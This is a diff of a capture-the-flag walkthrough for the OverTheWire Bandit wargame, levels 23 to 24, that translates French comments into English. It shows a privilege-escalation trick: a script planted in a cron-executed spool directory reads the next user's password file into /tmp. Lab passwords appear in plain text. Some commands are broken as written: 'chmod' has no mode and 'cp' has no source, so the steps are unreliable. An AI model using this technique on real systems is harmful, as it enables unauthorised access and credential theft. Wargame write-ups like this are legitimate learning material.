@@ -239,7 +239,7 @@ cat cronjob_bandit23
 cat /usr/bin/cronjob_bandit23.sh
 
 cat /tmp/$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
-##j'ai trouver echo I ... dans le script /usr/bin/cronjob_bandit23.sh
+#I found echo I am ... in the script /usr/bin/cronjob_bandit23.sh
 ```
 
 **Mot de passe level 23 :** <span class="pwd">QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G</span>
@@ -251,10 +251,9 @@ cd /etc/cron.d
 cat cronjob_bandit23
 
 cat /usr/bin/cronjob_bandit24.sh
-
-##j'ai créer un script shell-ricka.sh que j'ai copié dans /var/spool/bandit24/foo
-##car le script dans cronjob_bandit24.sh dit qu'il execute et supprime
-##les scripts dans /var/spool/$username/foo/
+#I have created a script called ricka.sh that I copied to /var/spool/bandit24/foo,
+#because the cronjob_bandit24.sh script executes and deletes all files in that directory,
+#so my script will be executed.
 mkdir /tmp/ricka
 chmod 777 /tmp/ricka
 cd /tmp/ricka
@@ -265,12 +264,12 @@ vim ricka.sh
 #!/bin/bash
 
 cat /etc/bandit_pass/bandit24 > /tmp/ricka/mdp
-####fin script#####
+####end of script#####
 
 chmod ricka.sh
 cp /var/spool/bandit24/foo/
 
-####J'attend un peu
+####All I do is wait until my script is executed and then
 cat mdp
 ```
 **Mot de passe level 24 :** <span class="pwd">VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar</span>
